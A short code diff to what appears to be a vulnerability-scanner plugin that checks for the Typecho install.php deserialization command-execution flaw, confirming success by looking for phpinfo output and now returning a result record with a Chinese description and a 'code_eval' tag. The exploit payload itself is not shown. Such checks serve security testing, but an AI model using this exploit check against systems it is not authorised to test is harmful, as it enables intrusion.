@@ -27,4 +27,11 @@ def poc(arg,**kwargs):
     }
     hh = hack.http(shellpath,post=post_data)
     if r"Configuration File (php.ini) Path" in hh.text():
-        return True
+        result = {
+            "name": "typecho install.php反序列化命令执行",  # 插件名称
+            "content": "漏洞产生在install.php中，base64后的值被反序列化和实例化后发生命令执行。",  # 插件返回内容详情，会造成什么后果。
+            "url": arg,  # 漏洞存在url
+            "log": hh.log,
+            "tag": "code_eval"  # 漏洞标签
+        }
+        return result
